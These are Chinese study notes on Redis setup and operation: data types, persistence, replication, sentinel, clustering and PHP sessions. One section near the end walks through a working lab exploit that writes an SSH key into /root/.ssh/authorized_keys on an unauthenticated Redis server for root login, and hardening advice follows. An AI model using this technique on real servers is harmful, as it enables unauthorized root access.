@@ -1,0 +1,678 @@
+﻿案例：
+memcached ,redis,varnish对比
+memcached：
+   是一个高性能的分布式内存对象缓存系统，用在动态web应用中减少数据库负载，从而提升访问速度。
+   它通过在内存中缓存数据和对象来减少读取数据的次数，从而提高网站的速度
+   memcached是一个旁路式缓存。功能的实现一半依赖于客户端，一半基于服务器端
+   网络IO模型方面,Memcached是多线程，分为监听线程、worker线程，引入锁，带来了性能损耗。
+redis：
+  redis可以用做缓存，因为它以Key-Value的形式将数据存储在内存中
+  但本质上redis是一个内存数据库，支持五种数据类型（string，list，集合，有序集合，hash），以及一些简单的逻辑运算。
+  redis缺点：redis通过定时快照（sanpshot）功能，每隔一段时间将多个数据库的数据写到磁盘上来实现数据持久化，由于每次是写全部数据，代价非常高
+  网络IO模型方面,Redis使用单线程的IO复用模型，将速度优势发挥到最大，也提供了较简单的计算功能 
+varnish：
+  key-value类型缓存，通过hash文件内容来保存文件，其查询速度是O1，其新鲜度检测机制支持广泛，acl控制非常灵活，是一款代理式缓存
+  varnish缺点：持久存储功能有待完善
+
+57-1
+Redis特性:（remote dictionary server）
+        单进程服务
+	KV cache and store
+	in-memory(所以内存最好配置大些）
+	持久化（持久化机制为RDB和AOF，借助于硬盘实现）
+        主从复制
+	高可用（借助于sentinel实现一定意义上的服务HA，sentinel的作用同mysql中的MHA非常相似，先实现主从复制，然后对主节点实现高可用)
+	Clustering分布式
+        本质是一个数据结构服务器：String, List, Hash（其实可以理解为关联数组）, Set, Sorted Set, Bitmap, HyperLoglogs（没有写错）
+	存储系统有三类：
+		RDBMS
+		NoSQL:
+			KV NoSQL：redis
+			Column Family NoSQL: HBase
+			Documentation NoSQL: MongoDB
+			Graph NoSQL: Neo4j
+		NewSQL
+最好安装redis的3.0+版本，因为3.0+版本自带有sentinel功能
+redis的3.0+版本的安装步骤：
+    从pkgs.org下载合适的版本，比如redis-4.0.0-0.3.RC3.el6.remi.x86_64.rpm
+    yum install -y  redis-4.0.0-0.3.RC3.el6.remi.x86_64.rpm
+    service redis-server start等效于redis-server  /etc/redis.conf 
+    /etc/redis.conf配置文件介绍
+        tcp-backlog tcp消息队列，并发访问量很大时，会产生消息队列
+        database 表示可以使用多少个数据库
+[root@localhost Downloads]# redis-cli -h 
+redis-cli 3.9.103
+Usage: redis-cli [OPTIONS] [cmd [arg [arg ...]]]
+  -h <hostname>      Server hostname (default: 127.0.0.1).
+  -p <port>          Server port (default: 6379).
+  -s <socket>        Server socket (overrides hostname and port).
+  -a <password>      Password to use when connecting to the server.
+  -r <repeat>        Execute specified command N times.
+  -i <interval>      When -r is used, waits <interval> seconds per command.
+                     It is possible to specify sub-second times like -i 0.1.
+具体案例：
+redis-cli -h 192.168.139.171 
+redis 192.168.139.171:6379> help 
+redis-cli 2.4.10
+Type: "help @<group>" to get a list of commands in <group>
+      "help <command>" for help on <command>
+      "help <tab>" to get a list of possible help topics
+      "quit" to exit
+	Redis的组件：
+		redis的官网是redis.io，也可以在pkgs.org中搜索redis
+	Redis守护进程：
+		监听端口：6379/tcp
+                slect #，表示选择#数据库
+
+    基本数据类型如下：
+		Strings:字符串
+			SET key value [EX #，过期时间] [NX，key不存在时才赋予新值|XX，key存在时才赋予新值]
+			GET
+			INCR 针对一个整数，增加一个key的值
+			DECR 针对一个整数，减小一个key的值
+			EXIST
+                        APPEND
+                        strlen 获取一个键的长度
+                        keys  获取匹配
+字符串的具体使用案例：
+redis 192.168.139.171:6379> set name chenhao
+OK
+redis 192.168.139.171:6379> get name 
+"chenhao"
+127.0.0.1:6379> set count 0 
+OK
+127.0.0.1:6379> INCR count 
+(integer) 1
+127.0.0.1:6379> INCR count 
+(integer) 2
+127.0.0.1:6379> get count 
+"2"
+		Lists:列表,联想python中的列表
+			LPUSH  从左侧创建列表
+			RPUSH  从右侧创建列表
+			LPOP   从左侧删除
+			RPOP   从右侧删除
+			LINDEX 获取对应index的值
+			LSET   修改对应index的值
+lists具体使用案例：
+127.0.0.1:6379> LPUSH l1 mon 
+(integer) 1
+127.0.0.1:6379> LPUSH l1 second
+(integer) 2
+127.0.0.1:6379> LINDEX l1 0 
+"second"
+127.0.0.1:6379> LINDEX l1 1 
+"mon"
+127.0.0.1:6379> LSET l1 0 hello 
+OK
+127.0.0.1:6379> LINDEX l1 0 
+"hello"
+		Sets:集合，联想python中的集合
+                help @set
+			SADD      增加元素，也可以创建集合
+			SINTER    交集
+			SUNION    并集
+			SISMEMBER 判断给定的一个值是否是集合中的一个成员
+                        SPOP
+
+sets的具体使用案例：
+127.0.0.1:6379> SADD nu1 1 2 34 5 7 8  创建一个集合
+(integer) 6
+127.0.0.1:6379> SADD nu2 1 5 7 9 10 11 
+(integer) 6
+127.0.0.1:6379> SINTER nu1 nu2 
+1) "1"
+2) "5"
+3) "7"
+127.0.0.1:6379> SUNION nu1 nu2 
+1) "1"
+2) "2"
+3) "5"
+4) "7"
+5) "8"
+6) "9"
+7) "10"
+8) "11"
+9) "34"
+127.0.0.1:6379> SISMEMBER nu1 1  判断1是否是nu1集合中的成员
+(integer) 1 1表示是
+127.0.0.1:6379> SISMEMBER nu1 10 
+(integer) 0 0表不是
+
+		Sorted Sets:有序集合，就是有排序的集合，联想python中的有序集合
+                        help @sorted_set
+			ZADD   创建一个有序集合
+			ZRANGE 返回指定范围内的集合元素，有自己内置的index
+			ZCARD  获取指定集合的个数
+			ZRANK  获取指定集合中元素的index
+                        zscore 获取指定元素的分数
+有序集合的具体使用案例：
+127.0.0.1:6379> ZADD wek1 1 mon 2 tues 3 wens 
+(integer) 3
+127.0.0.1:6379> ZRANGE wek1 0 2  0和2表示index
+1) "mon"
+2) "tues"
+3) "wens"
+127.0.0.1:6379> ZCARD wek1 
+(integer) 3
+127.0.0.1:6379> ZSCORE wek1 tues 
+"2"
+		Hashes:就是映射，KV结构,有点类似python的字典
+                help @hash
+			HSET    创建映射
+			HSETNX  Set the value of a hash field, only if the field does not exist
+			HGET    获取field对应的值
+			HKEYS   获取映射里面所有的键列表
+			HVALS   获取映射里面所有的值列表
+			HDEL
+hashes的具体使用案例：
+127.0.0.1:6379> HSET wek2 a mon 
+(integer) 1
+127.0.0.1:6379> HSET wek2 b twe 
+(integer) 1
+127.0.0.1:6379> HKEYS wek2 
+1) "a"
+2) "b"
+127.0.0.1:6379> HVALS wek2 
+1) "mon"
+2) "twe"
+
+57-2 
+	认证实现方法：
+		(1) vim /etc/redis.conf
+		       requirepass PASSWORD
+		(2) redis-cli连接到redis数据库
+                    127.0.0.1:6379>select 0 
+                    出现失败消息
+		    127.0.0.1:6379> AUTH PASSWORD
+	事务：
+		通过MULTI, EXEC, WATCH等命令实现事务功能；
+                将一个或多个命令归并为一个操作提请服务器按顺序执行的机制；
+                支持原子性，要么都执行，要么都不执行，但是不支持回滚操作；
+		  MULTI：启动一个事务；
+		  EXEC:  真正开始执行事务；一次性将事务中的所有操作执行完成后返回给客户端；此时其他客户端的请求将被阻塞
+		  WATCH（需要在MULI命令前启动）：
+                       乐观锁；
+                       在EXEC命令执行之前，用于监视指定数量键；如果监视中的某任意键数据被修改，则服务器拒绝执行事务；
+                       redis也支持ACI，但是持久存储通过定期同步数据到硬盘实现
+                 DISCARD:取消事务，放弃执行事务块内的所有命令
+事务的具体案例：
+127.0.0.1:6379> MULTI  启动事务
+OK
+127.0.0.1:6379> set ip 123 
+QUEUED 表示值在队列中
+127.0.0.1:6379> get ip
+QUEUED
+127.0.0.1:6379> set age 20 
+QUEUED
+127.0.0.1:6379> get age
+QUEUED
+127.0.0.1:6379> exec 提交事务
+1) OK
+2) "123"
+3) OK
+4) "20"
+带有监控功能的事务案例：
+127.0.0.1:6379> watch ip 
+OK
+127.0.0.1:6379> MULTI 
+OK
+127.0.0.1:6379> set ip 321 
+QUEUED
+127.0.0.1:6379> exec  
+(nil) 由于监控到IP已经发生了变化，所以执行事务失败
+打开另外一个终端
+127.0.0.1:6379> get ip 
+"123"
+127.0.0.1:6379> set ip 678 
+OK
+127.0.0.1:6379> get ip 
+"678"
+	Connection相关的命令：
+                是在help @connection组里
+		AUTH
+		ECHO 显示指定字符串
+		PING 直接ping服务器是否在线
+		QUIT
+		SELECT 选择数据库，使用案例见下面
+
+	Server相关的命令：
+                是在help @server组里
+		CLIENT SETNAME connection-name
+		CLIENT GETNAME
+		CLIENT KILL ip:port
+		CONFIG GET  获取配置信息
+		CONFIG RESETSTAT 重置info命令出现的信息
+		CONFIG SET parameter value  在redis交互界面下，修改配置参数
+		CONFIG REWRITE（把memory中的配置参数写到硬盘文件里面）
+		DBSIZE 返回数据库中键的数量
+		BGSAVE（异步保存数据到硬盘，对应持久功能）
+		SAVE  （同步保存数据到硬盘，对应持久功能）
+		LASTSAVE（获取最近一次保存成功的时间）
+                SLAVEOF  开启主从，设置主节点的IP和port
+                info     获取当前服务器的信息和统计数据
+                monitor  实时打印出Redis服务器接收到的命令，一般调试用
+		FLUSHDB： 清空当前库
+		FLUSHALL：清空所有库
+             
+server端相关命令使用案例：
+127.0.0.1:6379> monitor  
+OK
+1523970139.133068 [0 127.0.0.1:38410] "COMMAND"
+1523970140.774195 [0 127.0.0.1:38410] "ping"   在另外一个终端执行ping命令
+127.0.0.1:6379> config get *   可以获取服务器端所有配置信息
+  1) "dbfilename"   这是key
+  2) "dump.rdb"     这是value
+  3) "requirepass"
+  4) ""
+server的具体操作案例：
+127.0.0.1:6379[2]> select 1  默认一进来是0号数据库，总共有0-15号
+OK
+127.0.0.1:6379[1]> dbsize   显示当前数据库的key数量
+(integer) 1
+127.0.0.1:6379[1]> keys  *
+1) "key1"
+127.0.0.1:6379[1]> flushdb   清除当前数据库的所有key，flushall则是把所有数据库key清除
+OK
+127.0.0.1:6379[1]> dbsize
+(integer) 0
+
+server的具体操作案例：
+127.0.0.1:6379> CLIENT SETNAME loalhost 
+OK
+127.0.0.1:6379> CLIENT GETNAME
+"loalhost
+127.0.0.1:6379> info memory 
+# Memory
+used_memory:839704
+used_memory_human:820.02K
+used_memory_rss:5537792
+used_memory_rss_human:5.28M
+used_memory_peak:840008
+used_memory_peak_human:820.32K
+used_memory_peak_perc:99.96%
+used_memory_overhead:827984
+used_memory_startup:760968
+used_memory_dataset:11720
+used_memory_dataset_perc:14.89%
+total_system_memory:596246528
+total_system_memory_human:568.62M
+used_memory_lua:37888
+used_memory_lua_human:37.00K
+maxmemory:0
+maxmemory_human:0B
+maxmemory_policy:noeviction
+mem_fragmentation_ratio:6.59
+mem_allocator:jemalloc-3.6.0
+active_defrag_running:0
+lazyfree_pending_objects:0
+
+used_memory：当前Redis所有key-value值及内部开销理论上要占用的内存
+used_memory_human：上一数据的可读版本
+used_memory_rss：Resident Set Size常驻数据集大小,可理解为OS为Redis分配的物理内存总量
+used_memory_peak：峰值内存
+used_memory_peak_human：峰值内存可读版本
+used_memory_lua：lua引擎占用内存
+mem_fragmentation_ratio：内存碎片率，used_memory_rss 和 used_memory 之间的比率（以下有更多说明）
+mem_allocator: Redis 所使用的内存分配器。可以是libc 、 jemalloc或者tcmalloc
+
+内存碎片率分析：
+大于1：OS为Redis分配的物理内存 > Redis所有key-value值及内部开销应占用的内存
+产生原因：物理内存多出的部分，Redis内移除对象的占用内存，但这部分内存由Redis自带内存分配器占用，没有向操作系统返回。这一部分就是内存碎片。
+小于1：OS为Redis分配的物理内存 < Redis所有key-value值及内部开销理应占用的内存
+产生原因：应占内存比物理内存多出的部分，是被操作系统交换到虚拟内存，说明当前Redis的内存使用已经超出物理内存
+OOM就是out of memory
+
+	发布与订阅(publish/subscribe)
+        help @pubsub
+		频道：消息队列
+		SUBSCRIBE: 订阅一个或多个队列；
+		PUBLISH: 向频道发布消息；
+		UNSUBSCRIBE：退订此前订阅的频道；
+		PSUBSCRIBE：模式订阅
+发布和订阅的具体操作案例：
+127.0.0.1:6379> SUBSCRIBE news 
+Reading messages... (press Ctrl-C to quit)
+1) "subscribe"
+2) "news"
+3) (integer) 1
+1) "message"--每一次消息显示以message开头
+2) "news"
+3) "hello"
+1) "message"
+2) "news"
+3) "redis"
+打开另外一个终端
+127.0.0.1:6379> PUBLISH news hello
+(integer) 1
+127.0.0.1:6379> PUBLISH news redis 
+(integer) 1
+
+        差与脚本相关命令
+
+
+	Redis的持久化：redis本身没有持久性，只有redis服务器开启持久功能，才能实现持久功能。服务重启后，数据依然还在，此时有点类似mysql--重点
+		RDB和AOF两种实现机制
+			RDB特性：---本质是记录数据,redis默认开启的持久化机制就是RDB
+                            父进程通过fork生产一个子进程来执行save命令，父进程可以继续接受新请求
+                            本质是snapshot机制，二进制格式；
+                            修改配置文件实现RDB：按事先定制的策略（修改配置文件中的save参数，有save参数表示开启RDB，注销save参数表示停掉RDB），
+                                                 周期性地将内存数据保存至磁盘；产生的数据文件默认为dump.rdb; 
+			    客户端使用命令实现RDB：
+                                        使用SAVA或BGSAVE命令启动快照保存机制；
+					SAVE:   同步，在主线程中保存快照；此时会阻塞所有客户端请求；
+					BGSAVE：异步，主进程不会被占用，所有其他客户端可以继续进行；可以把BGSAVE理解为back ground save，即后台保存
+			AOF特性：--本质是记录sql语句，也就是写命令
+                             Append Only File（非常类似mysql的bin-log机制）
+			     记录每一次写操作至指定的文件尾部实现持久化；
+                             当redis重启时，可通过重新执行文件中的命令在内存中重建数据库；
+		             BGREWRITEAOF：
+                                  AOF文件重写（目的是减小file的大小），不会读取正在使用AOF文件，
+                                  而通过将内存中的数据以命令的方式保存到临时文件中，完成之后替换原来的AOF文件；
+			RDB：(RDB机制的缺点是恢复时，会丢失掉电间隔时间内的数据）
+				SAVE 900 1     表示900秒至少有1个键发生改变，则做一次快照保存
+				SAVE 300 10
+				SAVE 60 10000
+                                vim /etc/redis.conf  
+				stop-writes-on-bgsave-error yes 如果bgsave发生错误，则停止写操作
+				rdbcompression yes
+				rdbchecksum yes
+				dbfilename dump.rdb  表示dump.rdb在/var/lib/redis目录中
+				dir /var/lib/redis
+			AOF:
+			重写过程：
+			(1) redis主进程通过fork创建子进程；
+			(2) 子进程根据redis内存中的数据创建数据库重建命令序列于临时文件中；
+		        (3) 在子进程构建数据库期间，父进程继续client的请求，并会把这些请求中的写操作继续追加至原来AOF文件；同时这些新的写请求还会被放置于一个缓冲队列中
+			(4) 子进程重写完成，会通知父进程；父进程把缓冲中的命令写到临时文件中
+			(5) 父进程用临时文件替换老的aof文件
+				相关参数：
+					appendonly no 默认是关闭的
+					appendfilename "appendonly.aof"
+					appendfsync {always|everysec|no} everysec表示每一秒同步一次
+					no-appendfsync-on-rewrite no 
+					auto-aof-rewrite-percentage 100 （当前的AOF文件是上次的2倍时，就要触发重写操作，而且是自动的）
+					auto-aof-rewrite-min-size 64mb  （当AOF文件至少为64mb时，才触发重写,目前小恩爱的部分redis这个值是20G
+		注意事项：
+                    持久本身不能取代备份；还应该制定备份策略，对redis数据库定期进行备份；
+		    如果RDB与AOF同时启用：默认是启动RDB，关闭AOF
+			(1) BGSAVE（RDB机制）和BGREWRITEAOF（AOF机制）不会同时执行；
+			(2) 在Redis服务器启动用于恢复数据时，会优先使用AOF，因为AOF保存的数据是最新的；
+没有一个持久化存储的案例
+	       复制特点：
+			一个Master可以有多个Slave；
+			支持链式复制；
+			Master以非阻塞方式同步数据至slave；
+		主从操作方式:--主从之间传递的是数据，不像mysql那样传递是sql语句
+                        主库在把数据同步给从库前，会先把内存数据保存在一个文件中（类似mysql的中继日志文件），然后把该文件发给从库。
+                        从库接收到该文件后，然后把该中间文件加载到内存中，实现数据同步
+                        从库操作步骤：
+                        1）vim /etc/redis.conf
+                           slaveof <masterip> <masterport> 此参数可以修改配置文件实现，也可以手动输入命名来实现
+                           min-slaves-to-write 3           必须要有3个从库，主库才支持写操作
+                           min-slaves-max-lag 10           从库落后主库不能超过10秒，否则主库不支持写操作
+                        2）先使用redis-cli命令连入redis数据库
+			   127.0.0.1:6379> slaveof  MASTER_IP MASTER_PORT
+                           127.0.0.1:6379> info
+                           127.0.0.1:6379> keys *  验证所有key是否已经同步过来
+		  注意：
+                    如果master使用requirepass开启了认证功能，从服务器要使用masterauth <PASSWORD>来连入服务请求使用此密码进行认证；
+                    stale表示过期、不新鲜
+主从复制的具体步骤：
+    主节点：192.168.139.171 
+    1)vim /etc/redis.conf 
+          bind 0.0.0.0  要修改为监听本机的所有IP地址，否则主从复制有可能失败
+          daemonize yes 把进程启动为守护进程即后台形式
+    2)service redis-server start=redis-server /etc/redis.conf
+    3)redis-cli -h 192.168.139.171 
+    4)set ip 123 
+      set cache varnish 
+    5)keys * 查看所有的键
+    从节点：192.168.139.192 
+    vim /etc/redis.conf 
+    bind 0.0.0.0  
+    daemonize yes 
+    redis-server /etc/redis.conf
+    redis-cli -h 192.168.139.192
+    slaveof 192.168.139.171 6379 --关键命令
+    info replication
+    keys * 如果能显示出所有的键说明主从复制正常
+
+sentinel：哨兵--非常相似mysql中的MHA,sentinel只是对主节点实现了高可用，但是没有能实现读写分离，概念要搞清楚
+                1）sentinel本身是另外一个节点服务，只监控主节点，从主节点获知从节点信息，发现主节点下线后，提升某一个从节点成为主节点
+		2）用于管理多个redis服务实现HA；
+			监控
+			通知
+			自动故障转移
+			流言协议，投票协议
+                3）为了避免sentinel成为单节点故障，sentinel自身应该是奇数个节点
+		启动sentinel程序的3种方式：
+                       redis-sentinel /etc/redis-sentinel.conf=redis-server /etc/redis-sentinel.conf  --sentinel=service redis-sentinel start 
+			    (1) 服务器自身初始化，运行redis-server中专用于sentinel功能的代码；
+			    (2) 初始化sentinel状态，根据给定的配置文件，初始化监控的master服务器列表；
+			    (3) 创建连向master的连接；
+		专用sentinel配置文件：/etc/redis-sentinel.conf
+			(1) sentinel monitor <master-name> <ip> <redis-port> <quorum>
+			             sentinel monitor mymaster 127.0.0.1 6379 2
+                                    （2指的是sentinel自身的法定票数，比如有3个sentinel节点，法定票数应该过半，即2，sentinel自身应该是一个奇数节点集群）
+			(2) sentinel down-after-milliseconds <master-name> <milliseconds>
+			             sentinel down-after-milliseconds mymaster 30000   经过3000ms联系不到主节点后，可以认为主节点下线了
+			(3) sentinel parallel-syncs <master-name> <numslaves>          新的主服务器，刚开始可以接受多少个连接
+			             sentinel parallel-syncs mymaster 1
+			(4) sentinel failover-timeout <master-name> <milliseconds>
+				     sentinel failover-timeout mymaster 180000          
+                                     当主节点故障时，提升从节点为主节点，在故障转移超时时间内没有操作成功，即认为提升从节点失败
+ 		主观下线，客观下线：
+ 			主观下线：一个sentinel实例判断出某节点下线；
+ 			客观下线：多个sentinel节点协商后判断出某节点下线；
+ 		SENTINEL专用命令：（在sentinel节点中执行该命令，但是该命令没有补全功能---重要）
+ 			SENTINEL masters 列出所有监听的主服务器
+ 			SENTINEL slaves <master name>，获取指定主服务器的从节点信息
+ 			SENTINEL get-master-addr-by-name <master name> 根据master name获取master的地址
+ 			SENTINEL reset 重置
+ 			SENTINEL failover <master name> 手动强制实施故障转移
+                说明：在同一个主机上启动多个redis进程，来模拟sentinel场景
+ 	Clustering：
+ 		分布式数据库，通过分片机制进行数据分布，clustering内的每个节点仅数据库的一部分数据；
+ 	        每个节点持有全局元数据（即客户端连入任何一个节点都可以进行正常的数据访问）
+利用sentinel来监控redis的具体操作步骤：先配置好主从复制，然后再配置sentinel
+  redis-server  /etc/redis.conf(正常的6379端口进程模拟成主节点）  
+    redis-cli -h 192.168.139.171 
+    set ip 123 
+    set cahce varnish 
+    keys * 查看所有的键
+  port为6380和6381的进程模拟为从节点
+    cp /etc/redis.conf{,.1}
+    vim /etc/redis.conf.1 
+        port 6380
+        pidfile /var/run/redis_6380.pid
+        logfile /var/log/redis/redis1.log
+        dir /var/lib/redis1/
+    mkdir /var/lib/redis1
+    chown -R redis:redis /var/lib/redis1 
+    redis-server  /etc/redis.conf.1
+    ss -tunl 查看6380端口是否已经启动
+    redis-cli -h 192.168.139.171 -p 6380
+    slaveof 192.168.139.171 6379 
+    keys *  务必要先确保主从配置是正常的
+    cp /etc/redis.conf{,.2}
+    vim /etc/redis.conf.2 
+        port 6381
+        pidfile /var/run/redis_6381.pid
+        logfile /var/log/redis/redis2.log
+        dir /var/lib/redis2/
+    mkdir /var/lib/redis2
+    chown -R redis:redis /var/lib/redis2
+    redis-server  /etc/redis.conf.2
+    ss -tunl 查看6380端口是否已经启动
+    redis-cli -h 192.168.139.171 -p 6381
+    slaveof 192.168.139.171 6379 
+    keys *  务必要先确保主从配置是正常的
+
+sentinel节点配置
+    vim /etc/redis-sentinel.conf 
+        sentinel monitor mymaster 192.168.139.171  6379 1 由于只启动了一个sentinel节点，所以quorum为1
+    redis-sentinel  /etc/redis-sentinel.conf & 
+    ss -tunl
+    redis-cli -h 192.168.139.171 -p 26379
+    192.168.139.171>setinel masters 
+    192.168.139.171>sentinel slaves #确认主从架构是否正常
+    ps aux找出port为6379的进程号并杀掉
+    连入到port为6380或者6381的进程，执行info replication验证主库是否已经顺利切换
+
+redis的分布式解决方案：部分方案可以同时实现读写分离，减轻主库读压力
+1）twemproxy，由twitter研发，但是现在twitter内部自己已经不再使用，原因是twemproxy自身是单点故障
+2）codis，国内有很多中小企业使用，建议使用
+3）redis cluster，是redis官方提供，维护成本高，必须要redis 3.0以上才支持，而且要求客户端也要支持cluster功能
+4）cerberus
+一般来说redis主从复制+sentinel已经可以满足生产中的大部分场景
+最终没有找到一个合适的读写分离方案
+
+twemproxy的站点是http://www.cnblogs.com/gomysql/p/4413922.html
+[root@localhost ~]# rpm -e --nodeps autoconf                      不能执行yum remove -y autoconf，否则会把依赖到的aclocal都卸载掉了，但是后面又要用到aclocal
+[root@localhost chenhao]# tar -zxvf autoconf-2.69.tar.gz
+[root@localhost chenhao]# cd autoconf-2.69
+[root@localhost autoconf-2.69]# ./configure  --prefix=/usr/       不能写成--prefix=/usr/local/autoconf
+[root@localhost autoconf-2.69]# make  
+[root@localhost autoconf-2.69]# make  install
+[root@localhost chenhao]# unzip twemproxy-master.zip
+[root@localhost chenhao]# cd twemproxy-master
+[root@localhost twemproxy-master]# autoreconf -fvi                 因为前面的安装路径是--prefix=/usr/，该路径在PATH中，所以此处可以直接执行autoreconf -fvi
+
+客户端分片:包括jedis在内的一些客户端，实现了客户端分片机制
+基于代理的分片:twemproxy,codis
+路由查询:redis-cluster
+
+作为一种基数统计算法，比如统计一个千万级别以上的访问日志文件中不同IP出现的次数，传统实现方式是把文件中的所有IP取出并存储到hash set中，计算总数即可。
+但处理海量数据时，对内存的占用量将会特别大，因此就有了所谓的“位图法“，
+位图可以快速、准确地获取一个给定输入的基数。位图的基本思想是使用哈希函数把数据集映射到一个bit位，每个输入元素与bit位是一一对应。
+这样Hash将没有产生碰撞冲突，并减少需要计算每个元素映射到1个bit的空间。虽然Bitmap大大节省了存储空间，但当统计很高的基数或非常大的不同的数据集时，
+这仍然有问题。好在基数统计作为一个新兴的领域，已经出现不少开源算法，基数统计算法的思想是用准确率换取空间，准确率可以稍稍差一点点，
+但是可以大大的缩减占用的空间。例如，目前3个比较有代表的算法是：Java HashSet、Linear Probabilistic Counter以及一个Hyper LogLog Counter。
+
+利用代理中间件实现大规模Redis集群
+把php会话保存在redis中，详细memcached
+[root@localhost ~]# yum install httpd php redis -y
+[root@localhost ~]# yum install php-cli  php-common   php-gd  php-ldap  php-mbstring  php-mcrypt  php-pdo php-devel php-pear  -y
+[root@localhost ~]# pecl install redis   pecl命令是由php-pear包产生的；pecl install redis主要是为了安装php的redis扩展redis.so
+[root@localhost ~]# vim /etc/php.ini
+session.save_handler = redis
+session.save_path = "tcp://192.168.139.131:6379"
+extension=redis.so                 约在920行
+[root@localhost ~]# vim /var/www/html/index.php
+<?php
+session_start();
+if(!isset($_SESSION['test'])) {
+$_SESSION['test'] = time();
+}
+print$_SESSION['test'];
+print"<br><br>";
+print"Session ID: " . session_id();
+print"\n"
+?>
+[root@localhost ~]# service httpd start 
+在浏览器中输入http://192.168.139.131/index.php, 出现如下界面
+1509052918
+Session ID: 6abrbkqkvrmjevgpcvprlj1fl6
+[root@localhost ~]# redis-cli  -h 127.0.0.1 
+127.0.0.1:6379> keys * 
+1) "PHPREDIS_SESSION:6abrbkqkvrmjevgpcvprlj1fl6" 出现PHPREDIS_SESSION
+127.0.0.1:6379> get PHPREDIS_SESSION:6abrbkqkvrmjevgpcvprlj1fl6
+"test|i:1509052918;"
+
+
+redis漏洞测试，因为redis默认是以root用户启动的，而且是无密码认证，所以才有机会执行漏洞
+1)在远程主机192.168.1.114安装好redis
+]# yum install -y redis
+]# redis-server /etc/redis.conf 修改下redis，以后台进程运行，同时监听在本机的0.0.0.0
+]# ps aux|grep redis   因为redis默认是root用户启动的，所以后面可以利用这个权限来做事情
+root      2763  0.0  0.4 143040  5688 ?        Rsl  22:35   0:01 redis-server 0.0.0.0:6379
+2)在远程主机192.168.1.102确保有redis-cli客户端即可
+]# echo -e '\n' > foo.txt  
+]# cat .ssh/id_rsa.pub  >> foo.txt
+]# echo -e '\n' >>  foo.txt  必须要确保公钥的前后有换行存在，避免如果有其他key存在时，保存的时候保存在一行里面，这样公钥就不生效了
+]# cat foo.txt
+
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9NpgKHUcOb37RE+DUr3AiBy+kwuP7Ohh4Nq6DzUazp0IO1EAnnybc8gNoGcHbx2fiUU1mYWLOHJL/qr12cjy8cN42lGyLjw3oUhZn14EXMlIjOKQOmdFFNhvA1m2zLJU0JRvzfTkwJbV8pbJl+Ry+DTfhcUuQ3HuYfxk/y3wgmmJKHfHl+b8tswD3ZN0owH+Nwj2jCDYXiSggjnIz58j3ZY+YXOtuJWWMBjgD8zuRbbTobhpBfBTBPnwaDSbX6/sUk9OXFSnZmOHorWZrXszgQ5577YqXupk787I63rbqdD+9qunN9tzSGzG9eJVbXKnvM9xbW1w0D+uRmjfGsc5J root@localhost.localdomain
+
+
+
+]# cat foo.txt |redis-cli -h 192.168.1.114 -x set key2
+OK
+]# redis-cli -h 192.168.1.114
+192.168.1.114:6379> config set dir /root/.ssh  修改备份目录  config get/set分别用来获取和设置服务器信息
+OK
+192.168.1.114:6379> config set dbfilename 'authorized_keys'  修改备份文件名，此时所有的key都保存在authorized_keys了
+OK
+192.168.1.114:6379> save
+OK
+192.168.1.114:6379> exit
+3)在在远程主机192.168.1.114确认/root/.ssh/authorized_keys,并确认是否有完整的公钥存在
+4)在远程主机192.168.1.102测试登录192.168.1.114
+  ssh root@192.168.1.114  无密码认证成功，说明漏洞执行成功
+
+redis预防措施
+- 以普通用户权限启动redis-server服务，也就是不要以root身份运行redis。某些缺省安装的redis数据目录 /usr/local/var/db/ 是root所有，这个也要改成其他用户或者换目录。
+- 给安装好的redis增加身份验证。修改redis.conf。requirepass mypassword
+- 通过配置rename-command CONFIG “”,禁止一些命令。（必须以高权限运行的，可以参考此方法）修改redis.conf，增加： 
+  rename-command FLUSHALL “” 
+  rename-command FLUSHDB “” 
+  rename-command CONFIG “” 
+  rename-command EVAL “”
+  redis服务器不对外网开发。
+- 尽量避免以root身份起非linux必不可少的服务器程序，比如mysqld可以额外建立mysql用户起。必需以root起的，比如nginx等web服务器，可以用spawn一个低权限进程完成实际工作。
+  或者类似<1024端口这种，以iptables进行端口映射
+
+redis集群安装:
+用两台虚拟机模拟6个节点，一台机器3个节点，创建出3 master、3 salve环境,所以如下步骤两台虚拟机都需要操作
+cd /data/software
+wget http://download.redis.io/releases/redis-3.2.4.tar.gz
+tar -zxvf redis-3.2.4.tar.gz　
+cd redis-3.2.4
+make 
+make install
+make test  如果此步出错，执行yum install tcl,确保tcl是8.5版以上即可
+mkdir redis_cluster/{7000,7001,7002} -p   另外一个节点是7003,7004,7005
+cp redis.conf redis_cluster/7000
+cp redis.conf redis_cluster/7001
+cp redis.conf redis_cluster/7002　
+vi redis_cluster/7000/redis.conf
+port  7000                                         
+bind  172.17.0.2                                       
+daemonize    yes                               
+pidfile  /var/run/redis_7000.pid          
+cluster-enabled  yes                         
+cluster-config-file  nodes_7000.conf 
+cluster-node-timeout  15000
+其他配置文件参考如此修改
+redis-server redis_cluster/7000/redis.conf
+redis-server redis_cluster/7001/redis.conf
+redis-server redis_cluster/7002/redis.conf
+netstat -tunlp检查端口监听情况
+在其中任意一台节点做如下操作
+yum -y install ruby ruby-devel rubygems rpm-build
+gem install redis  -y  如果出现ruby版本低问题，参照ruby文档解决即可
+redis-trib.rb  create  --replicas  1  172.17.0.2:7000 172.17.0.2:7001  172.17.0.2:7002 172.17.0.3:7003  172.17.0.3:7004  172.17.0.3:7005  
+.......
+[OK] All 16384 slots covered.
+测试访问
+]# redis-cli  -h 172.17.0.2 -c -p 7000  -c表示连接到集群
+172.17.0.2:7000> set key1 chenhao
+-> Redirected to slot [9189] located at 172.17.0.3:7003
+OK
+]# redis-cli  -h 172.17.0.3 -c -p 7003
+172.17.0.3:7003> keys *
+1) "key1"
+172.17.0.3:7003> get key1  说明安装成功
+"chenhao"
+
+redis集群原理介绍：
+redis cluster在设计的时候，就考虑到了去中心化，去中间件，也就是说，集群中的每个节点都是平等的关系，都是对等的，每个节点都保存各自的数据和整个集群的状态。
+每个节点都和其他所有节点连接，而且这些连接保持活跃，这样就保证了我们只需要连接集群中的任意一个节点，就可以获取到其他节点的数据。
+Redis 集群没有并使用传统的一致性哈希来分配数据，而是采用另外一种叫做哈希槽 (hash slot)的方式来分配的。redis cluster 默认分配了16384 个slot，当我们set一个key 时，
+会用CRC16算法来取模得到所属的slot，然后将这个key 分到哈希槽区间的节点上，具体算法就是：CRC16(key) % 16384。所以我们在测试的时候看到set 和 get 的时候，
+直接跳转到了7000端口的节点。
+Redis 集群会把数据存在一个master节点，然后在这个master和其对应的salve之间进行数据同步。当读取数据时，也根据一致性哈希算法到对应的master节点获取数据。
